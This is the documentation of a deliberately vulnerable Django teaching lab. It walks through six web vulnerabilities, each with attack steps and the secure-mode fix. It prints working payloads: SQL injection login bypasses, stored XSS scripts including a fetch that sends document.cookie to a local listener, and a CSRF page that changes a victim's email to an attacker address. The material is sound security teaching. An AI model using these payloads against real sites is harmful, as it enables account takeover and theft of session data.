The six demos

This app is a teaching lab. It contains real, working versions of six common web vulnerabilities, and next to each one it contains the fix. A single switch decides which version runs: 

# vulnerable (the default)
python manage.py runserver

# fixed
SECURE_MODE=1 python manage.py runserver

The recipe for every demo is the same: perform the attack in vulnerable mode, then restart the server in secure mode and perform exactly the same attack again. Nothing changes except which side of an if statement runs.

The point of the whole lab. Django is secure by default. Almost none of these bugs are things Django left for you to fix - they are protections Django already gave you that the vulnerable code has to deliberately switch off. Every time you read the source, look for the comment marked BYPASS:. That line is the bug.

1. SQL injection on the login form

A web application talks to its database by sending it sentences written in SQL. If the application builds those sentences by gluing your typing directly into the middle of the string, then your typing is not just data any more - it becomes part of the sentence. A single apostrophe closes the quoted value early, and everything you type after it is read by the database as instructions. The classic payload ' OR '1'='1' -- closes the username string, adds a condition that is always true, and comments out the rest of the query - including the part that checks the password. The vulnerable login here queries a "legacy accounts" table that stores passwords in plain text, which is what makes the result so damaging: the attacker gets in, and the whole password list is one query away.

Steps to reproduce vulnerable mode

  1. Make sure you are logged out, then go to /login/.
  2. In Username type exactly: ' OR '1'='1' -- (apostrophe, space, OR, space, apostrophe, 1, apostrophe, equals, apostrophe, 1, apostrophe, space, two hyphens).
  3. In Password type anything at all, for example x.
  4. Press Log in. You are now signed in as prof, the teacher - the first row in the table - without knowing any password.
  5. Check the banner in the top-right of the page: it says you are the teacher. Visit /courses/1/grades/ to see what that account can reach.
  6. Log out, and try to target a specific victim instead: username alice' -- with any password. The -- comments out the password check, so you log in as Alice.
  7. Go back to the login page after a failed attempt - it prints the exact SQL that ran, so you can see your apostrophe breaking the query in half.

What the fix does secure mode

The secure branch does not build SQL at all. It calls Django's authenticate(), which looks the user up through the ORM. The ORM sends the query template and the values to the database as two separate things (a parameterised query), so the database always knows which bytes are instructions and which are data. Your apostrophes are just characters in a username that does not exist. It also compares your password against a salted PBKDF2 hash rather than a plain-text column, so even a full database dump does not hand over anyone's password.

Django already prevented this. LegacyAccount.objects.filter(username=u, password=p) would have been immune with no effort at all. Writing the insecure version took more work than writing the secure one: we had to reach past the ORM for connection.cursor() and hand-build the string. If you ever find yourself doing that, stop.

2. Stored cross-site scripting (XSS) in forum posts

A browser cannot tell the difference between JavaScript the site's authors wrote and JavaScript that arrived in the middle of a forum post - it is all just text in the same HTML document, and it all runs with the same powers. Stored XSS means the attacker's script is saved in the database once and then served to everybody who opens that page, over and over, for as long as the post exists. One student posting one reply gets their code running in the browser of every classmate and of the teacher, inside their session, able to read the page, read the cookies, and send requests as them. This is why the vulnerability is far more serious than an alert box makes it look.

Steps to reproduce vulnerable mode

  1. Log in as bob / bob123.
  2. Open a thread, for example Welcome to CS340.
  3. In the reply box, post this and submit:
    <script>alert('XSS by ' + document.title)</script>
  4. The alert fires immediately - but that is not the demo. Log out, log back in as alice / alice123, and open the same thread. It fires for her too. It will fire for everyone, every time, until the post is deleted.
  5. Now show why it matters. Post a second reply:
    <script>alert('Session cookie: ' + document.cookie)</script>
    The session id is displayed. Anyone who copies that value into their own browser is logged in as the victim, without ever knowing the password.
  6. Optional, more realistic: start a second server in another terminal with python -m http.server 9000, then post
    <script>fetch('http://127.0.0.1:9000/stolen?c='+document.cookie)</script>
    and watch the cookie appear in that terminal's access log. This is what real cookie theft looks like - silent, with no alert box.
  7. Payloads do not need <script> tags. Try <img src=x onerror="alert(1)"> - filters that only look for the word "script" miss this one.

What the fix does secure mode

Three separate layers, each of which would have been enough on its own:

  • Output escaping. The template drops the |safe filter, so Django's automatic escaping turns < into &lt;. The payload is displayed as text instead of being run. Note that we escape on the way out, not on the way in - the same stored text might later go into an email or a JSON API, where the dangerous characters are different ones.
  • HttpOnly cookies. SESSION_COOKIE_HTTPONLY = True makes the session cookie invisible to document.cookie, so even a successful injection cannot steal the session. Repeat step 5 in secure mode: the session id is gone from the output.
  • Content-Security-Policy. A middleware adds script-src 'self', which tells the browser to run scripts only if they came from this site's own URLs. Inline scripts - which is exactly what an injected payload is - are refused. Open the developer console in secure mode and you will see the browser report the blocked script.

Django already prevented this. Auto-escaping is on by default in every Django template. The vulnerable version exists only because somebody typed |safe (or called mark_safe()), which is a promise to Django that the string is trustworthy HTML. Never make that promise about anything a user typed. And note that we had to un-set SESSION_COOKIE_HTTPONLY, because Django turns it on for you.

3. Insecure direct object reference (IDOR)

Most web pages identify the thing they are showing you with a number in the URL: /messages/3/. That number is a direct reference to a row in a database table, and it is trivially guessable - if there is a message 3 there is probably a message 2. The vulnerability appears when the application checks that you are logged in, and then forgets to check that the thing you asked for is actually yours. Being authenticated (the app knows who you are) is not the same as being authorised (you are allowed to see this particular row), and no framework can guess the second one for you.

Steps to reproduce vulnerable mode

  1. Log in as alice / alice123.
  2. Go to /messages/. Alice has one message, number 4, from the professor. Open it and look at the URL.
  3. Edit the URL by hand: change it to /messages/2/. You are now reading a private message between Bob and Carol that Alice was never meant to see.
  4. Try /messages/1/ and /messages/3/ too. An attacker would simply write a loop over every number and download the whole message table.

Variant 3b: the same bug, about roles

The second version of this mistake is a page that is only meant for one kind of user, protected by nothing but the fact that no link points to it. That is "security through obscurity", and it is not security - a URL is not a secret.

  1. Still logged in as the student Alice, visit /courses/1/grades/.
  2. There is no link to this page anywhere in the student interface, but it opens anyway: you are looking at the whole class's grades, including Bob's failing mark and the professor's private comment about it.

What the fix does secure mode

For the messages, the ownership test becomes part of the lookup itself: the view asks for "this message, if I am its sender or its recipient", and answers 403 Forbidden otherwise. For the grades page, the view checks two things - that the user's role is teacher, and that they are the teacher of this specific course. Repeat both attacks in secure mode and you get 403 instead of somebody else's data.

What Django gives you and what it does not. @login_required is built in and answers "who are you?". Django also ships @permission_required and @user_passes_test for role checks. But the question "does this row belong to this person?" depends entirely on what your application means, so it is the one piece of security you always have to write yourself. Make it part of the query, not an afterthought - a filter you forget to add fails open, and nobody notices until it is on the news.

4. Cross-site request forgery (CSRF)

Your browser attaches your cookies for a site to every request that goes to that site - it does not care which page started the request. So if you are logged into this forum in one tab, and you open an attacker's page in another tab, that page can quietly make your browser submit a form to the forum, and the forum will see a perfectly ordinary, fully logged-in request from you. The attacker never sees the response and never steals your cookie; they do not need to. They just need your browser to perform one action on your behalf - change your email address, and then use "forgot password" to take the account. Django's defence is a secret token in every form, which the attacker's page cannot read because the browser's same-origin policy forbids reading another site's HTML.

Steps to reproduce vulnerable mode

  1. Log in as carol / carol123 and visit /profile/. Note the current email address, carol@example.edu.
  2. In a second terminal, serve the attacker's page from a different origin: 
    cd attacker
python -m http.server 9000
  3. In the same browser, still logged in, open http://127.0.0.1:9000/attacker.html. It looks like a harmless page about free exam papers.
  4. It contains a hidden form that submits itself to http://127.0.0.1:8000/profile/. Come back to /profile/ and reload: Carol's email is now attacker@evil.example.
  5. Carol clicked nothing. She visited one page on a completely different site.

What the fix does secure mode

The @csrf_exempt decorator stops applying, so Django checks every POST again: the request must carry the secret token that the real form embedded, and its Origin header must belong to this site. The attacker's page can make your browser send a request, but it cannot read the token out of the real form, so its forged POST gets 403 Forbidden. Repeat the attack in secure mode and the attacker's page shows Django's 403 page instead of a silent success.

Django already prevented this. The CSRF middleware is in MIDDLEWARE from the moment you run django-admin startproject, and it protects every POST view automatically. The only way to get this bug is to type @csrf_exempt. It exists for a genuine reason - webhook endpoints that authenticate by signature instead of cookies - but on a normal, cookie-authenticated form it is simply a hole.

Notice what the template does. {% templatetag openblock %} csrf_token {% templatetag closeblock %} is present in profile.html in both modes. In vulnerable mode the page dutifully renders a perfect token that the server never looks at. Security is enforced by the check, not by the token.

If the attack does not work, your browser may be defending you: modern browsers refuse to attach cookies to cross-site requests by default. The attacker page is served from the same host on a different port, which counts as the same site, so it should work everywhere - but this is worth knowing, and it is a good example of defence in depth. See the README.

5. Security misconfiguration

Most of the settings that keep a Django site safe are already correct when you generate the project - the danger is the handful you have to change before you deploy and might forget. The famous one is DEBUG. With DEBUG = True, any unhandled error returns a page containing the full stack trace, the value of every local variable at the moment of the crash, your installed apps, your URL map, the request headers and a dump of your settings. On your laptop that is a gift. On a public server it is a free map of your application, handed to anyone who can make it crash.

Steps to reproduce vulnerable mode

  1. Open /misconfig/ and press Trigger an unhandled error.
  2. Scroll through the yellow page. Under "Local vars" you will find secret_api_key and database_password printed in full - variables the programmer never intended anyone to see.
  3. Keep scrolling to the bottom for the settings dump and the complete list of installed applications and middleware, which tells an attacker exactly which libraries and versions to look up.
  4. Visit a URL that does not exist, such as /nope/. Django's 404 page in debug mode prints your entire URL configuration.
  5. Now run the deployment checker in a terminal: 
    python manage.py check --deploy
    and read the warnings.

What the fix does secure mode

DEBUG = False. Errors return a plain Server Error (500), and the traceback goes to the server log where only the operators can read it. Turning it off also starts enforcing ALLOWED_HOSTS, which blocks Host-header attacks. Run SECURE_MODE=1 python manage.py check --deploy and compare the much shorter list of warnings (eight drop to five).

You do not have to remember this list. manage.py check --deploy reads your settings and tells you what is wrong. Run it in CI and treat its output as errors. A few warnings survive even in secure mode here: the HTTPS-only ones (SECURE_SSL_REDIRECT, SECURE_HSTS_SECONDS, SESSION_COOKIE_SECURE, CSRF_COOKIE_SECURE) because the lab runs over plain HTTP on localhost, and the SECRET_KEY one because we hard-coded an insecure key. A real HTTPS deployment must clear all of them.

6. Using a component with a known vulnerability

Your application is not just the code you wrote. A typical Django project installs dozens of packages, each of which installs more, and any one of them can turn out to have a security flaw that was published months ago and fixed in a version you never upgraded to. You will not find these by reading your own code, because the bug is not in your code - the only way to find them is to compare your installed versions against a database of published vulnerabilities, automatically, on a schedule.

Steps to reproduce

requirements.txt deliberately pins PyYAML==5.3.1, a real release with a published arbitrary-code-execution CVE (CVE-2020-14343). Nothing in this app imports it - it is there purely so the scanner has something true to report. 

  1. pip install pip-audit
pip-audit -r requirements.txt
  2. Read the output: each row names the package, the version you have, the vulnerability identifier, and - most usefully - the version that fixes it.
  3. Look one of the identifiers up on https://osv.dev to see what the flaw actually was.
  4. Unpin the version, reinstall, and run the scan again to watch the finding disappear.

What the fix does

Upgrading is the entire fix. The lesson is about process rather than code: keep a lock file so you know exactly what you are running, run a scanner in your continuous integration so a new advisory fails the build rather than waiting to be noticed, and treat "our dependency has a CVE" as a bug with an owner and a deadline. We are not exploiting this one - the point is that the scan output is real.

A reminder about the law. Everything on this page is legal and useful here, because this application exists to be attacked and runs on your own machine. Running the same techniques against a system you do not own and do not have written permission to test is a criminal offence in most countries - in the UK the Computer Misuse Act 1990, in the US the Computer Fraud and Abuse Act, and equivalents elsewhere. "I was only curious" and "I did not break anything" are not defences. If you want more practice, use a lab that is meant for it: PortSwigger Web Security Academy, OWASP Juice Shop, or Hack The Box.
